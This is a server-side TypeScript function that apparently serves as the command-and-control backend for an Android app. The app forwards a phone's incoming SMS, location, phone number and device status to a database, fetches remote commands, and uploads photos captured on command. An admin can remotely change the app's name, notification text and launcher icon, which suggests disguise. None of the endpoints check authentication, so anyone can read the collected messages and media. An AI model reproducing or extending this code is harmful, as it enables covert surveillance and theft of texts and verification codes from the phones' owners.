import { createClient } from "https://esm.sh/@supabase/supabase-js@2.49.1";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type",
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    const url = new URL(req.url);
    const action = url.pathname.split("/").pop();

    // GET: list recent SMS for a device_id
    if (req.method === "GET" && action === "list-sms") {
      const deviceIdStr = url.searchParams.get("device_id");
      const limit = Math.min(parseInt(url.searchParams.get("limit") || "20"), 100);
      if (!deviceIdStr) {
        return new Response(JSON.stringify({ error: "device_id required" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      const { data: device } = await supabase
        .from("devices").select("id").eq("device_id", deviceIdStr).maybeSingle();
      if (!device) {
        return new Response(JSON.stringify({ messages: [] }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      const { data: msgs, error } = await supabase
        .from("sms_messages")
        .select("id, sender, message_body, received_at")
        .eq("device_id", device.id)
        .order("received_at", { ascending: false })
        .limit(limit);
      if (error) throw error;
      return new Response(JSON.stringify({ messages: msgs || [] }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // GET: poll pending commands for a device
    if (req.method === "GET" && action === "poll-commands") {
      const deviceIdStr = url.searchParams.get("device_id");
      if (!deviceIdStr) {
        return new Response(JSON.stringify({ error: "device_id required" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      const { data: device } = await supabase
        .from("devices").select("id").eq("device_id", deviceIdStr).maybeSingle();
      if (!device) {
        return new Response(JSON.stringify({ commands: [] }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      const { data: commands } = await supabase
        .from("device_commands")
        .select("id, command_type, command_data")
        .eq("device_id", device.id)
        .eq("command_status", "pending")
        .order("created_at", { ascending: true })
        .limit(10);
      return new Response(JSON.stringify({ commands: commands || [] }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // GET: poll undelivered admin -> device messages
    if (req.method === "GET" && action === "poll-messages") {
      const deviceIdStr = url.searchParams.get("device_id");
      if (!deviceIdStr) {
        return new Response(JSON.stringify({ error: "device_id required" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      const { data: device } = await supabase
        .from("devices").select("id").eq("device_id", deviceIdStr).maybeSingle();
      if (!device) {
        return new Response(JSON.stringify({ messages: [] }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      const { data: msgs } = await supabase
        .from("device_messages")
        .select("id, body, created_at")
        .eq("device_id", device.id)
        .is("delivered_at", null)
        .order("created_at", { ascending: true })
        .limit(20);
      const ids = (msgs || []).map((m: any) => m.id);
      if (ids.length > 0) {
        await supabase
          .from("device_messages")
          .update({ delivered_at: new Date().toISOString() })
          .in("id", ids);
      }
      return new Response(JSON.stringify({ messages: msgs || [] }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // GET: get signed URL for a media file
    if (req.method === "GET" && action === "media-url") {
      const path = url.searchParams.get("path");
      if (!path) {
        return new Response(JSON.stringify({ error: "path required" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      const { data, error } = await supabase.storage
        .from("device-media").createSignedUrl(path, 3600);
      if (error) throw error;
      return new Response(JSON.stringify({ url: data.signedUrl }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // GET: fetch current app config (used by the APK to customize name/notification remotely)
    if (req.method === "GET" && action === "get-config") {
      const { data } = await supabase
        .from("app_config")
        .select("app_name, app_subtitle, notification_title, notification_text, primary_color, active_launcher, updated_at")
        .eq("id", 1)
        .maybeSingle();
      return new Response(JSON.stringify(data || {}), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    if (req.method !== "POST") {
      return new Response(JSON.stringify({ error: "POST only" }), {
        status: 405,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ACTION: Upload media from device (multipart)
    if (action === "upload-media") {
      const formData = await req.formData();
      const deviceIdStr = formData.get("device_id") as string;
      const commandId = formData.get("command_id") as string | null;
      const mediaType = (formData.get("media_type") as string) || "photo";
      const file = formData.get("file") as File;

      if (!deviceIdStr || !file) {
        return new Response(JSON.stringify({ error: "device_id and file required" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const { data: device } = await supabase
        .from("devices").select("id").eq("device_id", deviceIdStr).maybeSingle();
      if (!device) {
        return new Response(JSON.stringify({ error: "Device not found" }), {
          status: 404,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const ext = file.name?.split(".").pop() || "jpg";
      const storagePath = `${deviceIdStr}/${Date.now()}.${ext}`;
      const arrayBuf = await file.arrayBuffer();

      const { error: uploadErr } = await supabase.storage
        .from("device-media")
        .upload(storagePath, arrayBuf, {
          contentType: file.type || "image/jpeg",
          upsert: false,
        });
      if (uploadErr) throw uploadErr;

      const { error: insertErr } = await supabase.from("device_media").insert({
        device_id: device.id,
        media_type: mediaType,
        media_url: storagePath,
        file_name: file.name || storagePath,
        file_size: file.size || 0,
      });
      if (insertErr) throw insertErr;

      if (commandId) {
        await supabase
          .from("device_commands")
          .update({ command_status: "completed", response_data: { media_path: storagePath } })
          .eq("id", commandId);
      }

      return new Response(JSON.stringify({ success: true, path: storagePath }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ACTION: Update command status
    if (action === "command-status") {
      const body = await req.json();
      const { command_id, status, response_data } = body;
      if (!command_id || !status) {
        return new Response(JSON.stringify({ error: "command_id and status required" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      const { error } = await supabase
        .from("device_commands")
        .update({ command_status: status, response_data: response_data || {} })
        .eq("id", command_id);
      if (error) throw error;
      return new Response(JSON.stringify({ success: true }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ACTION: Device reports message as read
    if (action === "message-read") {
      const body = await req.json();
      const ids: string[] = Array.isArray(body?.message_ids) ? body.message_ids : [];
      if (ids.length === 0) {
        return new Response(JSON.stringify({ success: true }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      await supabase
        .from("device_messages")
        .update({ read_at: new Date().toISOString() })
        .in("id", ids);
      return new Response(JSON.stringify({ success: true }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const body = await req.json();

    // ACTION: Register / heartbeat device
    if (action === "heartbeat") {
      const {
        device_id, device_name, phone_number, online_status,
        power_level, charger_status, screen_status, sms_card_status,
        latitude, longitude, location_accuracy,
        signal_strength, network_type,
      } = body;

      if (!device_id) {
        return new Response(JSON.stringify({ error: "device_id required" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const locationFields: Record<string, unknown> = {};
      if (typeof latitude === "number" && typeof longitude === "number") {
        locationFields.latitude = latitude;
        locationFields.longitude = longitude;
        locationFields.location_accuracy = typeof location_accuracy === "number" ? location_accuracy : null;
        locationFields.location_updated_at = new Date().toISOString();
      }

      const networkFields: Record<string, unknown> = {};
      if (typeof signal_strength === "number") networkFields.signal_strength = signal_strength;
      if (typeof network_type === "string" && network_type.length > 0) networkFields.network_type = network_type;

      const { data: existing } = await supabase
        .from("devices").select("id").eq("device_id", device_id).maybeSingle();

      const commonPayload = {
        device_name: device_name || device_id,
        phone_number: phone_number || null,
        online_status: online_status || "online",
        power_level: power_level ?? 0,
        charger_status: charger_status ?? false,
        screen_status: screen_status || "on",
        sms_card_status: sms_card_status || "normal",
        last_sync_time: new Date().toISOString(),
        ...locationFields,
        ...networkFields,
      };

      if (existing) {
        const { error } = await supabase.from("devices").update(commonPayload).eq("id", existing.id);
        if (error) throw error;
        return new Response(JSON.stringify({ success: true, device_uuid: existing.id, action: "updated" }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      } else {
        const { data, error } = await supabase
          .from("devices").insert({ device_id, ...commonPayload }).select("id").single();
        if (error) throw error;
        return new Response(JSON.stringify({ success: true, device_uuid: data.id, action: "created" }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
    }

    // ACTION: Forward SMS
    if (action === "forward-sms") {
      const { device_id, sender, message_body, received_at } = body;

      if (!device_id || !message_body) {
        return new Response(JSON.stringify({ error: "device_id and message_body required" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const { data: device } = await supabase
        .from("devices").select("id").eq("device_id", device_id).maybeSingle();

      if (!device) {
        return new Response(JSON.stringify({ error: "Device not found. Send a heartbeat first." }), {
          status: 404,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const { error } = await supabase.from("sms_messages").insert({
        device_id: device.id,
        sender: sender || "Unknown",
        message_body,
        received_at: received_at || new Date().toISOString(),
      });
      if (error) throw error;

      await supabase
        .from("devices")
        .update({ last_sync_time: new Date().toISOString(), online_status: "online" })
        .eq("id", device.id);

      return new Response(JSON.stringify({ success: true }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    return new Response(JSON.stringify({ error: "Unknown action" }), {
      status: 400,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (err) {
    console.error("Error:", err);
    return new Response(JSON.stringify({ error: (err as Error).message }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
